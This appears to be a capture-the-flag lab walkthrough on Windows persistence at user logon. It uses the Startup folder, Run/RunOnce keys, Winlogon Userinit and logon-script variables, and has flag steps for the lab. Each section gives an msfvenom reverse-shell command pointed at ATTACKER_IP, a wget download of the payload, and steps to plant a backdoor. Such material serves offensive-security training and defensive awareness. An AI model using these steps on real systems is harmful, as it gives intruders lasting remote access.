# Windows Local Persistence: Logon Triggered Persistence

Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This guide explores methods to plant payloads that execute when a user logs into the system.

---

## Startup Folder

Each user has a folder under:

```
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

You can place executables in this folder to run whenever the user logs in. Attackers can achieve persistence by dropping a payload here. Note that each user will only execute files in their specific folder.

To force all users to run a payload at logon, use the folder:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### Example: Reverse Shell Payload

1. Generate a reverse shell payload using `msfvenom`:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
    ```

2. Transfer the payload to the victim machine:

    ```bash
    python3 -m http.server
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    ```

3. Store the payload in the startup folder:

    ```cmd
    copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
    ```

4. Sign out and log back in via RDP to trigger the payload.

**THM Flag**: Use the shell to execute `C:\flags\flag10.exe` and retrieve the flag.

---

## Run / RunOnce Registry Keys

You can force a user to execute a program on logon via the registry. Use the following registry entries:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

- **`HKCU` keys**: Apply to the current user.
- **`HKLM` keys**: Apply to all users.

### Example: Reverse Shell Payload

1. Generate a reverse shell payload:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
    ```

2. Transfer and move the payload:

    ```cmd
    move revshell.exe C:\Windows
    ```

3. Create a `REG_EXPAND_SZ` entry under:

    ```
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    ```

    - Name: `MyBackdoor`
    - Value: Path to the payload.

4. Sign out and log back in to trigger the payload.

**THM Flag**: Use the shell to execute `C:\flags\flag11.exe` and retrieve the flag.

---

## Winlogon Registry Keys

Winlogon manages user profile loading after authentication. The following registry keys can be abused for persistence:

- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`

Appending commands to these keys allows execution without breaking the logon sequence.

### Example: Reverse Shell Payload

1. Generate a reverse shell payload:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
    ```

2. Transfer and move the payload:

    ```cmd
    move revshell.exe C:\Windows
    ```

3. Modify the `Userinit` key to include the payload:

    ```
    HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
    ```

4. Sign out and log back in to trigger the payload.

**THM Flag**: Use the shell to execute `C:\flags\flag12.exe` and retrieve the flag.

---

## Logon Scripts

The `userinit.exe` process checks for the `UserInitMprLogonScript` environment variable during logon. This variable can be used to assign a script to a user.

### Example: Reverse Shell Payload

1. Generate a reverse shell payload:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
    ```

2. Transfer and move the payload:

    ```cmd
    move revshell.exe C:\Windows
    ```

3. Create the `UserInitMprLogonScript` environment variable under:

    ```
    HKCU\Environment
    ```

    - Value: Path to the payload.

4. Sign out and log back in to trigger the payload.

**THM Flag**: Use the shell to execute `C:\flags\flag13.exe` and retrieve the flag.